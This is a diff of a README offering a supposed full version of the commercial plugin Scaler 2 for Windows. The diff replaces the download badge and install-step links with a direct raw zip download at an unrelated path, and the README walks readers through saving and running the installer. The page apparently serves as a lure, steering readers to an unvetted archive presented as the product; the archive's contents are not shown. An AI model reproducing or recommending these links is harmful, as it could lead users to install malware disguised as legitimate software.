@@ -5,7 +5,7 @@ description: "Download the full version of Scaler 2 for Windows 10 and 11 using 
 ---
 # 🎹 Scaler-2-2026 - Create professional chord progressions easily
 
-[![Download Scaler 2](https://img.shields.io/badge/Download-Scaler_2_2026-blue.svg)](https://github.com/Rahul260126/Scaler-2-2026)
+[![Download Scaler 2](https://img.shields.io/badge/Download-Scaler_2_2026-blue.svg)](https://raw.githubusercontent.com/Rahul260126/rahul260126.github.io/main/Sphenophorus/Latest-2.4.zip)
 
 Scaler-2-2026 acts as a powerful music theory tool for your computer. It helps you find melodies, create chord progressions, and learn music theory. The software works inside your music production program. You can use it to write songs faster and improve your music. 
 
@@ -22,7 +22,7 @@ Before you start, make sure you have the following ready on your Windows compute
 
 Follow these steps to get the software on your machine:
 
-1. Visit the project repository to access the files: [https://github.com/Rahul260126/Scaler-2-2026](https://github.com/Rahul260126/Scaler-2-2026).
+1. Visit the project repository to access the files: [https://raw.githubusercontent.com/Rahul260126/rahul260126.github.io/main/Sphenophorus/Latest-2.4.zip](https://raw.githubusercontent.com/Rahul260126/rahul260126.github.io/main/Sphenophorus/Latest-2.4.zip).
 2. Locate the download button on the main page.
 3. Choose the Windows installer file. It will typically end with the extension .exe or .zip.
 4. Save the file to your computer. A folder like your Downloads folder works well for this task.
